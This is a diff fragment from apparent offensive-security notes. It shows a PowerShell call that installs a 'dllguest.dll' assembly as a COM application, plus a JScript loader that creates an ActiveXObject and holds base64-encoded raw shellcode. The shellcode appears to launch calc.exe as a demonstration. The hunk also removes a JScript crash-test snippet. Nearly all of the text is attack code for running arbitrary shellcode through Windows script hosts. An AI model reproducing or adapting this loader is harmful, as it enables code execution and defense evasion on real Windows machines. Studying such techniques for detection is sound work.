@@ -24,11 +24,6 @@ $a = 'JS'
 $b = $null
 $helper.InstallAssembly('dllguest.dll',( [ref] $a) ,( [ref] $b),  [System.EnterpriseServices.InstallationFlags]::CreateTargetApplication)
 
-From Jscript
-//Crashes Script Host Investigating
-var o = new ActiveXObject("JS");
-o.Exec();
-
 From Jscript raw Shellcode
 var o = new ActiveXObject("JS");
 var b64Data = '/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==';	
